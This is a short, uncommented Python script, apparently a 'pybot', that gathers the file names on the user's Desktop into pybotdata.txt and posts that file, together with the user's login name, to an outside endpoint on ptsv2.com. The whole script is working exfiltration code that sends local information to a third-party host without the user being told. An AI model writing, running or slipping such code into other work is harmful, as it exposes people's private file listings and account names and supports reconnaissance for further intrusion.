import os
import requests
from os.path import expanduser

roottoil='http://ptsv2.com/t/jx4oe-1518655699'
url = roottoil+'/post'
pathtocopy = expanduser("~") +'/Desktop'

def search(path):
    filestocopy = "These are the files in the path" +  pathtocopy
    filelist = os.listdir(path)
    for fname in filelist:
        filestocopy += fname + ';'
    return filestocopy

def copy(filestocopy):
    fileything = open("pybotdata.txt", 'w')
    fileything.write(filestocopy)
    fileything.close()

filestocopy = search(os.path.abspath(pathtocopy))
copy(filestocopy)

files = {'file': open('pybotdata.txt', 'rb')}
values = {'user': os.getlogin()}
r = requests.post(url, files=files, data=values)

print(r.content)
print('check out ' + roottoil)

